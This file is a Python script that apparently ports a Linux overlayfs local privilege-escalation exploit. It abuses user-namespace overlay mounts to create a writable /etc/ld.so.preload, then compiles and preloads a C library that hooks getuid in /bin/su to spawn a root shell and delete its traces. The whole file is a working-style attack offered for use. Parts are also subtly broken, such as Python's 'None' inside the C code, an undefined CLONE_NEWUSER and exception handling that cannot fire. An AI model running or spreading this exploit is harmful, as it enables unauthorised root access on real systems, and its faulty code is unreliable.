import os
import subprocess
import time
from ctypes import CDLL

LIB = """
#include <unistd.h>

uid_t(*_real_getuid) (void);
char path[128];

uid_t
getuid(void)
{
    _real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
    readlink("/proc/self/exe", (char *) &path, 128);
    if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
        unlink("/etc/ld.so.preload");unlink("/tmp/ofs-lib.so");
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        execle("/bin/sh", "sh", "-i", None, None);
    }
    return _real_getuid();
}
"""

# Placeholder for the cloned child process function
def child_exec():
    os.system("rm -rf /tmp/ns_sploit")
    os.makedirs("/tmp/ns_sploit/work", exist_ok=True)
    os.makedirs("/tmp/ns_sploit/upper", exist_ok=True)
    os.makedirs("/tmp/ns_sploit/o", exist_ok=True)

    print("mount #1")
    try:
        os.system("mount -t overlay overlay /tmp/ns_sploit/o -o lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper")
    except Exception as e:
        try:
            os.system("mount -t overlay overlay /tmp/ns_sploit/o -o lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work")
            os.chmod("/tmp/ns_sploit/work/work", 0o777)
            file = ".access"
        except Exception as e:
            print("no FS_USERNS_MOUNT for overlayfs on this kernel")
            exit(-1)
    else:
        file = "ns_last_pid"

    os.chdir("/tmp/ns_sploit/o")
    os.rename(file, "ld.so.preload")

    os.chdir("/")
    os.system("umount /tmp/ns_sploit/o")
    print("mount #2")

    try:
        os.system("mount -t overlay overlay /tmp/ns_sploit/o -o lowerdir=/tmp/ns_sploit/upper,upperdir=/etc")
    except Exception as e:
        try:
            os.system("mount -t overlay overlay /tmp/ns_sploit/o -o lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work")
            os.chmod("/tmp/ns_sploit/work/work", 0o777)
        except Exception as e:
            exit(-1)

    os.chmod("/tmp/ns_sploit/o/ld.so.preload", 0o777)
    os.system("umount /tmp/ns_sploit/o")

def main():
    print("spawning threads")
    
    wrapper_pid = os.fork()
    if wrapper_pid == 0:
        # Inside wrapper
        try:
            CDLL('libc.so.6').unshare(CLONE_NEWUSER)  # This requires special permissions
        except Exception as e:
            print("failed to create new user namespace")
            exit(-1)

        init_pid = os.fork()
        if init_pid == 0:
            # Inside init
            child_pid = os.fork()
            if child_pid == 0:
                # Run child_exec function in child process
                child_exec()
                exit(0)
            else:
                os.waitpid(child_pid, 0)
                exit(0)
        
        os.waitpid(init_pid, 0)
        exit(0)
    
    time.sleep(0.3)
    os.wait()  # Wait for all threads

    print("child threads done")

    try:
        fd = os.open("/etc/ld.so.preload", os.O_WRONLY)
    except OSError:
        print("exploit failed")
        exit(-1)

    print("/etc/ld.so.preload created")
    print("creating shared library")

    with open("/tmp/ofs-lib.c", "w") as lib_file:
        lib_file.write(LIB)
    
    result = subprocess.run(["gcc", "-fPIC", "-shared", "-o", "/tmp/ofs-lib.so", "/tmp/ofs-lib.c", "-ldl", "-w"], check=False)
    if result.returncode != 0:
        print("couldn't create dynamic library")
        exit(-1)
    
    os.write(fd, b"/tmp/ofs-lib.so\n")
    os.close(fd)

    os.system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c")
    os.execl("/bin/su", "su")

if __name__ == "__main__":
    main()
